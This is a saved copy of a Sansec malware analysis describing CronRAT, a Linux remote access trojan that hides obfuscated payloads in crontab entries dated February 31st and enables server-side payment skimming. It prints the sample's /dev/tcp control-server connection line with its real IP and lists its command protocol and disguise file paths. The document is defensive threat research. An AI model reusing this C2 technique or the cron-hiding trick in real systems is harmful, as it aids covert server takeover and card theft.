<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://sansec.io/research/cronrat">Original</a>
    <h1>CronRAT malware hides behind February 31st</h1>
    
    <div id="readability-page-1" class="page"><div><section></section><section><div><article><ul><li></li><li></li><li></li></ul><div><p><img src="https://sansec.io/assets/posts/cache/c5ced30f35f2b6fd0bb78b596dcc6e8f.png" alt="CronRAT malware hides behind February 31st"/></p><div><p><strong>In the run-up to Black Friday, Sansec discovered a sophisticated threat that is packed with never-seen stealth techniques. This malware, dubbed ‚ÄúCronRAT‚Äù, hides in the Linux calendar system on February 31st. It is not recognized by other security vendors and is likely to stay undetected on critical infrastructure for the coming months. CronRAT enables server-side Magecart data theft which bypasses browser-based security solutions.</strong></p><p>At this time of year we typically see a surge in eCommerce attacks and new malware. Last week we analyzed a clever <a href="https://sansec.io/research/ecommerce-malware-linux-avp">malware</a> attacking online stores, and today we expose another, much more sophisticated threat. It is a Remote Access Trojan (RAT) and we have named it CronRAT.</p><p>Sansec found CronRAT to be present on multiple online stores, among them a nation‚Äôs largest outlet. Because of its novel execution, we had to rewrite part of our <a href="https://sansec.io/ecomscan">eComscan</a> algorithm in order to detect it. CronRAT is currently <a href="https://www.virustotal.com/gui/file/b46e51a2e757f4d75f1a1fff1165c6a0503b687db6c7e672021dcaa9bedf2d88/detection">undetected</a> by other security vendors.</p><p>CronRAT‚Äôs main feat is hiding in the calendar subsystem of Linux servers (‚Äúcron‚Äù) on a nonexistant day. This way, it will not attract attention from server administrators. And many security products do not scan the Linux cron system.</p><p>CronRAT facilitates persistent control over an eCommerce server. Sansec has studied several cases where the presence of CronRAT lead to the injection of payment skimmers (aka <a href="https://sansec.io/what-is-magecart">Magecart</a>) in server-side code.</p><p>Sansec director of threat research Willem de Groot observes:</p><blockquote><p>Digital skimming is moving from the browser to the server and this is yet another example. Most online stores have only implemented browser-based defenses, and criminals capitalize on the unprotected back-end. Security professionals should really consider the full attack surface.</p></blockquote><p>CronRAT‚Äôs stealth capabilities pose a serious threat to Linux eCommerce servers:</p><ul><li>Fileless execution</li><li>Timing modulation</li><li>Anti-tampering checksums</li><li>Controlled via binary, obfuscated protocol</li><li>Launches tandem RAT in separate Linux subsystem</li><li>Control server disguised as ‚ÄúDropbear SSH‚Äù service</li><li>Payload hidden in legitimate CRON scheduled task names</li></ul><h2 id="technical-analysis">Technical analysis</h2><p><img data-src="/assets/posts/cache/1bba56eb0615c0f758a8cab2c709ee19.png" alt=""/></p><p>The CronRAT adds a number of tasks to crontab with a curious date specification: <code>52 23 31 2 3</code>. These lines are syntactically valid, but would generate a run time error when executed. However, this will never happen as they are scheduled to run on February 31st. Instead, the actual malware code is hidden in the task names and is constructed using several layers of compression and base64 decoding.</p><p><img data-src="/assets/posts/cache/306c46518a35529e83eb04c11aca66ea.png" alt=""/></p><p>The actual payload (see <a href="https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f">raw</a> and <a href="https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f#file-cronrat-annotated-sh">annotated</a> copy) is a sophisticated Bash program that features self-destruction, timing modulation and a custom binary protocol to communicate with a foreign control server. As one security engineer remarks:</p><blockquote data-conversation="none" data-lang="en" data-theme="light"><p lang="en" dir="ltr">I thought I had mastered bash, but that script is giving me a headacheüòÖ</p>‚Äî „Ç¢„É´„Éü (@schrotthaufen) <a href="https://twitter.com/schrotthaufen/status/1463977342666170372?ref_src=twsrc%5Etfw">November 25, 2021</a></blockquote><p>Upon launch, it contacts the control server using an uncommon method for TCP communication:</p><div><div><pre><code><span>eval</span> <span>&#34;exec 3&lt;&gt;/dev/tcp/796077735/</span><span>$((</span><span>0</span>x1bb<span>))</span><span>&#34;</span> &amp;&gt;/dev/null <span>||</span> exit_with_code 5
</code></pre></div></div><p>This resolves to port <code>443</code> on <code>47.115.46.167</code>, an Alibaba hosted IP. This service generates a banner for the Dropbear SSH service, which is commonly installed on embedded devices. However, this is clearly a disguise.</p><p><img data-src="/assets/posts/cache/685b006d57d2c7433d9935ec1257b27e.png" alt=""/></p><p>CronRAT implements a custom binary protocol with random checksums, to avoid detection by firewalls and packet inspectors.</p><p><img data-src="/assets/posts/cache/59d1d9c21731d1f1c6364d3b7022fbf5.png" alt=""/></p><p>Once a connection with the C&amp;C server is established, CronRAT takes these steps:</p><ol><li>Discards the fake <code>SSH-2.0-dropbear_2017.75</code> banner.</li><li>Sends a password, the <code>cio</code> command and then (presumably) a host identifier.</li><li>Waits for a <code>sd</code> (self-destruct) or <code>ev</code> (eval) command from the control server</li><li>Sends <code>prm</code> command and password/identifier, then receives command parameters for the sidekick RAT</li><li>Sends <code>dwn</code> command and receives malicious dynamic library</li><li>Library is saved to one of these paths: <code>/dev/shm</code>, <code>/run/user/UID</code>, <code>/tmp</code>, <code>/var/tmp</code>, <code>HOME</code>, with one of these file names: <code>www-shared</code>, <code>server-worker-shared</code>, <code>sql-shared</code>, <code>php-shared</code>, <code>systemd-user.lock</code>, <code>php.lock</code>, <code>php-fpm.lock</code>, <code>www-server.lock</code>, <code>php_sess_RANDOM</code>, <code>zend_cache___RANDOM</code>, <code>php_cache</code>, <code>www_cache</code>, <code>worker_cahce</code> (sic), <code>logo_edited_DATE.png</code>, <code>user_edited_DATE.css</code>, <code>custom_edited_DATE.css</code></li><li>Runs custom <code>prm</code> command with the custom library loaded via <code>LD_PRELOAD</code>.</li><li>Monitors custom command for 5 seconds and, depending on success, sends <code>ssc</code>, <code>ser</code> or <code>sun</code> command.</li><li>Finishes with <code>cex</code> command.</li></ol><p>This essentially allows the RAT operator to run any code.</p><h2 id="coming-up">Coming up</h2><p>In order to study the control server‚Äôs behavior, we wrote a specially crafted RAT client to intercept commands. And this lead to the discovery of‚Ä¶ yet another RAT, which <em>also</em> uses never-seen stealth techniques. We will publish a followup shortly. <a href="https://twitter.com/sansecio">Follow us on Twitter</a> for the latest threats and ecommerce malware analysis!</p><p><em>We greatly appreciate the help of <a href="https://nl.linkedin.com/in/ciprianogroenendal">Cipriano Groenendal</a> at <a href="https://www.hypernode.com">Hypernode</a> for providing malware samples and valuable analysis.</em></p></div></div></article></div></section><section><div><div data-aos="fade-up"><div><h5>Stay ahead of eCommerce hacks,</h5><p>Sansec forensic experts were the first to document large scale digital skimming in 2015. Since then, we have investigated thousands of hacked stores. Our research of the latest attack vectors protects our customers around the world. Our anti-skimming technology and data are used by merchants, forensic investigators, financial anti-fraud teams and service providers</p><p><a href="https://sansec.io/ecomscan">Try our malware scanner</a></p></div></div></div></section></div></div>
  </body>
</html>
